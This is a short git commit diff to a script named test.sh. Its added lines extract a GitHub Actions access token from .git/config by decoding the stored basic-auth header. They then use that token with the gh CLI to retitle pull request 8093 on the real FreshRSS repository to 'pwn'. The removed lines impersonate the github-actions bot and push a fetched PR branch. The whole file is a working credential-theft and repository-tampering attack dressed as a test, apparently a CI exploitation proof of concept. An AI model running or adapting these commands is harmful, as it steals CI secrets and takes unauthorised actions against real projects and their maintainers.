6cea564a2000cf22fafa6c43dd8fe5d5c74610d8
Inverle <inverle@proton.me>
2025-10-12 16:01:56 +0200

    some more testing

--- test.sh
+++ test.sh
@@ -1,14 +1,6 @@
 #!/bin/bash
 
-git config user.name "github-actions[bot]"
-git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
-git restore .
-git remote set-url origin https://github.com/FreshRSS/FreshRSS
-git fetch origin pull/8093/head:target-pr
-git checkout target-pr
-# git remote -v > test
-# cp .git/config test2
-# git add test
-# git add test2
-git commit --allow-empty -a -m "???"
-git push --set-upstream origin target-pr
+export GITHUB_TOKEN="$(grep -oP 'basic \K[^$]*' .git/config | base64 -d | sed 's/x-access-token://')"
+
+gh repo set-default FreshRSS/FreshRSS
+gh pr edit 8093 -t "pwn"
